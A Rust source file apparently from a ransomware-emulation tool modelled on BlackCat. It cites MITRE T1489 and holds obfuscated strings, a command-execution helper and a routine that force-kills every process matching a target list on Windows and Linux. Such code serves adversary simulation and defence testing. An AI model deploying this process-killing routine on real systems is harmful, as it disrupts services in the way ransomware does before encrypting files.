// proc.rs - Process interaction (ex: execute a program, kill a process)

use std::error::Error;
use std::process::{Command,Output};
use std::str;
use crate::logger::{log_debug, log_info, log_error};
use encryptliterals::esl;

cfg_if! {
    if #[cfg(target_os = "windows")] {
        use windows::Win32::Foundation::{CloseHandle, ERROR_NO_MORE_FILES};
        use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
        use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
        use crate::winapi_helper::from_wstring;
    } else {
        use std::path::{Path, PathBuf};
    }
}

/// Execute given program and return output information (stdout, stderr, status)
pub fn exec_program(program: &str, args: &[&str]) -> Result<Output, Box<dyn Error>>{
    // Spawn a child process for program, and wait for it to return
    log_debug(format!("{}: {} {}", esl!("Executing"), program, args.join(" ")));
    let output = match Command::new(program)
        .args(args)
        .output() {
            Ok(o) => o,
            Err(e) => {
                Err(format!("{}: {}", esl!("Failed to execute process"), e))?
            }
        };
        log_debug(format!("{} {} {}", program, esl!("exited with"), output.status));

    Ok(output)
}

/// Execute given program and log stdout/stderr. Returns error if non-zero exit code
#[cfg(unix)]
pub fn exec_program_and_log_output(program: &str, args: &[&str]) -> Result<(), Box<dyn Error>>{
    let output = match exec_program(program, args){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{} {}: {}", esl!("Failed to execute"), program, e))?
        }
    };
    let stdout = str::from_utf8(&output.stdout)?;
    if stdout.len() > 0 {
        log_debug(format!("{}: {}", esl!("stdout"), stdout));
    }
    let stderr = str::from_utf8(&output.stderr)?;
    if stderr.len() > 0 {
        log_debug(format!("{}: {}", esl!("stderr"), stderr));
    }
    
    match output.status.code() {
        Some(code) => {
            if code != 0 {
                Err(format!("{} {}: {}", esl!("Non-zero exit status for"), program, output.status))?
            }
        }
        None => Err(format!("{} {}", program, esl!("process terminated by signal")))?
    }

    Ok(())
}

/**
 * killall_by_name
 *      About:
 *          Terminates specified Windows or Linux processes
 *      Result:
 *          Kills all processes with names matching those provided in kill_processes
 *      MITRE ATT&CK Techniques:
 *          T1489: Service Stop
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
*/
pub fn killall_by_name(kill_processes: &Vec<String>) {
    log_info(format!("{} {:?}", esl!("Attempting to kill processes"), kill_processes));

    #[cfg(target_os = "windows")] {
        let h_snapshot = unsafe {
            match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(h) => h,
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Failed to get process snapshot handle"), e));
                    return;
                }
            }
        };

        let mut pe32 = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            cntUsage: 0u32,
            th32ProcessID: 0u32,
            th32DefaultHeapID: 0,
            th32ModuleID: 0u32,
            cntThreads: 0u32,
            th32ParentProcessID: 0u32,
            pcPriClassBase: 0i32,
            dwFlags: 0u32,
            szExeFile: [0u16; 260],
        };
        unsafe {
            match Process32FirstW(h_snapshot, &mut pe32) {
                Ok(_) => {},
                Err(e) => {
                    log_error(format!("{}: {}", esl!("Process32FirstW failed"), e));
                    let _ = CloseHandle(h_snapshot);
                    return;
                }
            }
        }
        let mut done = false;
        while !done {
            let proc_name = from_wstring(&pe32.szExeFile);
            let trimmed = match proc_name.strip_suffix(".exe") {
                Some(s) => s.to_string(),
                None => proc_name.clone()
            };
            let proc_name_lower = trimmed.to_lowercase();
            if kill_processes.contains(&proc_name_lower) {
                unsafe {
                    match OpenProcess(PROCESS_TERMINATE, false, pe32.th32ProcessID) {
                        Ok(h_proc) => {
                            match TerminateProcess(h_proc, 9u32) {
                                Ok(_) => {
                                    log_info(format!("{} {} {} {}", esl!("Successfully terminated process"), proc_name, esl!("with PID"), pe32.th32ProcessID));
                                },
                                Err(e) => {
                                    log_error(format!("{} {} {} {}: {}", esl!("TerminateProcess failed for process"), proc_name, esl!("with PID"), pe32.th32ProcessID, e));
                                }
                            }
                            let _ = CloseHandle(h_proc);
                        },
                        Err(e) => {
                            log_error(format!("{} {} {} {}: {}", esl!("OpenProcess failed for process"), proc_name, esl!("with PID"), pe32.th32ProcessID, e));
                        }
                    }
                }
            }

            pe32.szExeFile.fill(0u16); // just in case
            unsafe {
                match Process32NextW(h_snapshot, &mut pe32) {
                    Ok(_) => {},
                    Err(e) => {
                        if e.code().0 == ERROR_NO_MORE_FILES.to_hresult().0 {
                            log_info(String::from(esl!("Finished iterating through processes.")));
                        } else {
                            log_error(format!("{}: {}", esl!("Process32NextW failed"), e));
                        }
                        done = true;
                    }
                }
            }
        }

        let _ = unsafe { CloseHandle(h_snapshot) };
    }

    #[cfg(unix)] {
        // iterate through /proc subdirectories to get process info
        let proc_entries = match std::fs::read_dir(esl!("/proc")) {
            Ok(p) => p,
            Err(e) => {
                log_error(format!("{}: {}", esl!("Failed to enumerate /proc"), e));
                return;
            }
        };

        for entry in proc_entries {
            if let Ok(entry) = entry {
                match get_pid_from_entry(&entry) {
                    Some(pid) => {
                        let mut exe_path_str = entry.path().into_os_string();
                        exe_path_str.push(esl!("/exe")); // read from /proc/PID/exe
                        let exe_path_buf: PathBuf = exe_path_str.into();
                        let exe_path = exe_path_buf.as_path();
                        if exe_path.exists() {
                            match std::fs::read_link(exe_path) {
                                Ok(true_path_buf) => {
                                    if is_target_proc(true_path_buf.as_path(), kill_processes) {
                                        let result = unsafe { libc::kill(pid, libc::SIGKILL) };
                                        if result != 0 {
                                            let err_code = std::io::Error::last_os_error().raw_os_error().unwrap_or(0); // instead of errno
                                            log_error(format!("{} {:?} {} {}. {}: {}", esl!("Failed to kill process"), true_path_buf, esl!("with PID"), pid, esl!("Error code"), err_code));
                                        } else {
                                            log_info(format!("{} {:?} {} {}", esl!("Killed process"), true_path_buf, esl!("with PID"), pid));
                                        }
                                    }
                                },
                                Err(_) => {}
                            }
                        }
                    },
                    None => {} // only process PID subdirectories
                }
            }
        }
    }
}

#[cfg(unix)]
fn is_target_proc(proc_path: &Path, kill_processes: &Vec<String>) -> bool {
    match proc_path.file_name() {
        Some(f) => {
            match f.to_str() {
                Some(file_name) => {
                    let file_name_string = file_name.to_string();
                    return kill_processes.contains(&file_name_string);
                },
                None => {
                    return false;
                }
            }
        },
        None => {
            return false;
        }
    }
}

#[cfg(unix)]
fn get_pid_from_entry(entry: &std::fs::DirEntry) -> Option<i32> {
    if entry.path().is_dir() {
        match entry.file_name().to_str() {
            Some(path) => {
                return match path.parse::<i32>() {
                    Ok(pid) => Some(pid),
                    Err(_) => None
                };
            },
            None => {
                log_error(format!("{} {:?}", esl!("Failed to convert path to string for"), entry.file_name()));
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::proc::exec_program;
    // Test that stdout matches expected stdout with simple "echo hello"
    #[test]
    fn test_exec_program() {
        let hello: Vec<u8>;
        let program: &str;
        let args: [&str; 2];
        if cfg!(windows){
            hello = "hello\r\n".as_bytes().to_vec();
            program = "cmd";
            args = ["/C", "echo hello"];
        }
        else if cfg!(unix){
            hello = "hello \n".as_bytes().to_vec();
            program = "echo";
            // Since I use a static array, this has to match in size to the windows args length
            // Which results in the extra space character after "hello"
            args = ["hello", ""];
        }
        else {
            panic!("Untested platform")
        }
        // spawn a child task and wait to it return, then check stdout for expected value
        let option = exec_program(program, &args);
        match option {
            Err(e) => panic!("exec_program failed: {}", e),
            Ok(s) => {
                assert_eq!(hello, s.stdout)
            }
        }
    }
}